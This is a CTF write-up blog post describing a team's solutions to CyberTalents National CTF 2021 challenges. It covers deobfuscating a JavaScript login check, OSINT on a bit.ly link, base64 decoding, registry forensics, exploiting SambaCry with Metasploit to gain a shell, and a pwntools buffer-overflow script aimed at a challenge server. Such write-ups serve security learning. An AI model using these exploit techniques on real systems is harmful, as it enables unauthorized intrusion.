---
title: "CyberTalents National CTF"
author: "Trevor saudi"
date: 2021-09-12T11:01:27.242Z
lastmod: 2022-05-24T14:32:06+03:00

description: ""

subtitle: "My team and I recently took place in the CyberTalents National CTF 2021 where we emerged 1st in Kenya :) We managed to solve all…"

image: "/posts/2021-09-12_cybertalents-national-ctf/images/1.png" 
images:
 - "/posts/2021-09-12_cybertalents-national-ctf/images/1.png"
 - "/posts/2021-09-12_cybertalents-national-ctf/images/2.png"
 - "/posts/2021-09-12_cybertalents-national-ctf/images/3.png"
 - "/posts/2021-09-12_cybertalents-national-ctf/images/4.png"
 - "/posts/2021-09-12_cybertalents-national-ctf/images/5.png"
 - "/posts/2021-09-12_cybertalents-national-ctf/images/6.png"
 - "/posts/2021-09-12_cybertalents-national-ctf/images/7.png"
 - "/posts/2021-09-12_cybertalents-national-ctf/images/8.png"
 - "/posts/2021-09-12_cybertalents-national-ctf/images/9.png"
 - "/posts/2021-09-12_cybertalents-national-ctf/images/10.png"
 - "/posts/2021-09-12_cybertalents-national-ctf/images/11.png"
 - "/posts/2021-09-12_cybertalents-national-ctf/images/12.png"
 - "/posts/2021-09-12_cybertalents-national-ctf/images/13.png"
 - "/posts/2021-09-12_cybertalents-national-ctf/images/14.png"
 - "/posts/2021-09-12_cybertalents-national-ctf/images/15.png"


aliases:
    - "/cybertalents-national-ctf-68f38cf7db2a"


tags:
- Forensics
- Web
- BOF
- CTF
---

![image](/posts/2021-09-12_cybertalents-national-ctf/images/1.png#layoutTextWidth)


My team and I recently took place in the CyberTalents National CTF 2021 where we emerged 1st in Kenya :) We managed to solve all challenges but one. Here are some of the writeups for the challenges we solved

Since the challenges are down, I will try my best to reconstruct the solutions

### Argos-web 50 pts

Argos was an ‘easy’ rated challenge, well some may tend to disagree :) This challenge was solved by @[k0imet](https://twitter.com/k0imet_)

First step involved a directory bruteforce on the challenge link, which gave us a directory **java.php .** This page contained some obfuscated javascript that handled the authentication.

```javascript
'use strict';

function _0x267a(_0x29ae1d, _0x59beb8) {
  var _0x2dca0b = _0x2dca();
  return _0x267a = function (_0x267a3d, _0x79f9b7) {
    _0x267a3d = _0x267a3d - 0x116;
    var _0x4cbcf2 = _0x2dca0b[_0x267a3d];
    return _0x4cbcf2;
  }, _0x267a(_0x29ae1d, _0x59beb8);
}
var _0x18eaa6 = _0x267a;

function _0x2dca() {
  var _0x4a962f = ['556864LePYhO', '93KGoDMv', 'wrong\x20Password', '14665ltxznd', '41121RGIWyS', '50236HEZbSV', '75OrlJRv', '260kpgQAa', '1316543gDJbid', '80096jdpdhM', 'value', '318iCKAiJ', '17205968dLvimS', 'getElementById', 'CT2021', '12SXIKHp', '232oiseyT'];
  _0x2dca = function () {
    return _0x4a962f;
  };
  return _0x2dca();
}(function (_0x59e2bc, _0x3b27b9) {
  var _0x3463b2 = _0x267a,
    _0x486916 = _0x59e2bc();
  while (!![]) {
    try {
      var _0x4861c6 = -parseInt(_0x3463b2(0x120)) / 0x1 + -parseInt(_0x3463b2(0x11d)) / 0x2 * (parseInt(_0x3463b2(0x119)) / 0x3) + -parseInt(_0x3463b2(0x121)) / 0x4 * (-parseInt(_0x3463b2(0x11e)) / 0x5) + -parseInt(_0x3463b2(0x123)) / 0x6 * (-parseInt(_0x3463b2(0x11b)) / 0x7) + -parseInt(_0x3463b2(0x117)) / 0x8 * (parseInt(_0x3463b2(0x11c)) / 0x9) + parseInt(_0x3463b2(0x11f)) / 0xa * (parseInt(_0x3463b2(0x118)) / 0xb) + -parseInt(_0x3463b2(0x116)) / 0xc * (-parseInt(_0x3463b2(0x124)) / 0xd);
      if (_0x4861c6 === _0x3b27b9) break;
      else _0x486916['push'](_0x486916['shift']());
    } catch (_0x3e62db) {
      _0x486916['push'](_0x486916['shift']());
    }
  }
}(_0x2dca, 0xc909d));
var _0xae5b = [_0x18eaa6(0x122), 'user', _0x18eaa6(0x125), 'pass', _0x18eaa6(0x126), '\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Congratz\x20\x0a\x0a', _0x18eaa6(0x11a)];

function check() {
  var _0x105bf3 = document[_0xae5b[0x2]](_0xae5b[0x1])[_0xae5b[0x0]],
    _0xe27d13 = document[_0xae5b[0x2]](_0xae5b[0x3])[_0xae5b[0x0]];
  _0x105bf3 == _0xae5b[0x4] && _0xe27d13 == _0xae5b[0x4] ? alert(_0xae5b[0x5]) : alert(_0xae5b[0x6]);
};
```

The important function to look at is **check**. Towards the end a comparison is made and an alert is given. The alert was the error message shown if the login was correct or incorrect. We also have an array of strings and in the array is a string called ‘CT2021’

This [writeup](https://hackersdad.medium.com/cybertalents-ctf-this-is-sparta-write-up-adb1fd0263e9) has a similar challenge and we can find out which variables are being passed. CT2021 was the user and pass for the website, which upon login gives us the flag.

### Missing person-osint 50 pts

In this challenge we had trace the most recent online activity of a missing person. We were given this [https://bitly.com/3frKIAX](https://bitly.com/3frKIAX) link which led us to a twitter account with protected tweets.

![image](/posts/2021-09-12_cybertalents-national-ctf/images/2.png#layoutTextWidth)


From the new twitter url [https://twitter.com/rzsdw2iwug77eda/status/1394223468003176455](https://twitter.com/rzsdw2iwug77eda/status/1394223468003176455)

We can spot the username [**rzsdw2iwug77eda**](https://twitter.com/rzsdw2iwug77eda/status/1394223468003176455)**.** So immediately my mind went to [sherlock](https://github.com/sherlock-project/sherlock).

![image](/posts/2021-09-12_cybertalents-national-ctf/images/3.png#layoutTextWidth)


We get a pastebin, with a date

![image](/posts/2021-09-12_cybertalents-national-ctf/images/4.png#layoutTextWidth)


So apparently this is a red herring. This date wasn’t the user’s most recent activity.

After thinking for a while. I decided to try and trace when the bit.ly was created. My [teammate](https://twitter.com/k0imet_) ended up uncovering the trick. By adding a ‘+’ to the end of the bit.ly link you can trace when it was first created. The date here was the solution

![image](/posts/2021-09-12_cybertalents-national-ctf/images/5.png#layoutTextWidth)


### Laggy Decoder-secure coding 100pts

In this challenge, we needed to fix the source code provided. The data being passed to the function was not being sanitized and one could achieve some XSS

Modify the utils file to . Submitting the modified code gives us the flag

![image](/posts/2021-09-12_cybertalents-national-ctf/images/6.png#layoutTextWidth)


### 64rev-cryptography 100pts

This solution was curated by @[k0imet](https://twitter.com/k0imet_) and @[mystickev](https://twitter.com/mystic_kev) . We are given a base64 encode string 
```
fdXU1Z2hSRwIzaHAxQ8zcjNIX3MxNUdqaWRmPT09XiNUdqaWRmPT09XihkZCUtVGhncz8lHJmIzmh1dGRyZ0Zmd2dlfV8zcjNIX3MxX3IzaHAxQ18zNXIzdjNSXzNscG0zNV97Z2FsZgZGRmNVxQ18zanNnaGZkYWhocaWRmPT0TWNkc2hdXU1Z2hSRwIzaHAxQ8zcjNIX3MxNfV9fM3IzSF9zMV9yM2hwMUNfMzVyM3YzUl8zbHBtMzVfX3tnYWxm==
```
Using cyberchef to decode , you can pick out bits of the flag in the output i.e 1s_H3r3

![image](/posts/2021-09-12_cybertalents-national-ctf/images/7.png#layoutTextWidth)


So our goal is to remove noise from the base64 string by removing some chunks of bytes. Removing fd at the beginning and == at the end

![image](/posts/2021-09-12_cybertalents-national-ctf/images/8.png#layoutTextWidth)


We get 2 flags. One of them was the answer

### Red pipe -machines 100pts

For this challenge, we are given an IP for a machine. We need to gain a shell and get the flag.

![image](/posts/2021-09-12_cybertalents-national-ctf/images/9.png#layoutTextWidth)


From the challenge name I suspected the solution would involve pipes. So I google the samba version of the nmap results

![image](/posts/2021-09-12_cybertalents-national-ctf/images/10.png#layoutTextWidth)


So our vuln was the is_known_pipename() from SambaCry. Luckily metasploit has this module

![image](/posts/2021-09-12_cybertalents-national-ctf/images/11.png#layoutTextWidth)


We get a shell

![image](/posts/2021-09-12_cybertalents-national-ctf/images/12.png#layoutTextWidth)


### Roony-forensics 100pts

This was a simple forensics challenge that required us to utilize a registry explorer tool to find the most recent executed application

After tons of googling. I found a tool called Registry Explorer that could simplify the solution. All I needed to do was supply a registry key to navigate the file hierachy as follows

Load the hive file

![image](/posts/2021-09-12_cybertalents-national-ctf/images/13.png#layoutTextWidth)


Interact with the hive file to get an overview of the file hierachy

![image](/posts/2021-09-12_cybertalents-national-ctf/images/14.png#layoutTextWidth)


Use the registry key — ‘recent file list’ to get the most recent executed application

![image](/posts/2021-09-12_cybertalents-national-ctf/images/15.png#layoutTextWidth)


The flag was gpedit.msc

### Ch4nger —Exploitation 50 pts easy

This solution was curated by my teammate @[gilbert](https://twitter.com/BinaryChunk). It is a simple buffer overflow challenge where we need to overwrite the return address with _0x_deadbeef

We can solve the challenge using pwntools as follows
```python3
#!/usr/bin/python3

from pwn import * 


filename = "./chall"

#io = process(filename)
io = remote("3.122.102.231", 6666)
context.clear(arch="i386")

def main():
	payload = b"A"*200 + p32(0xdeadbeef)
	io.sendline(payload)
	flag = io.recvline().decode().strip()
	log.info("The final flag is: \n\t %s" % flag)

if __name__ == "__main__":
	main()
```



These were the tricky challenges in the CTF and I hope you learned a thing or two. Follow like and share if you enjoyed :)
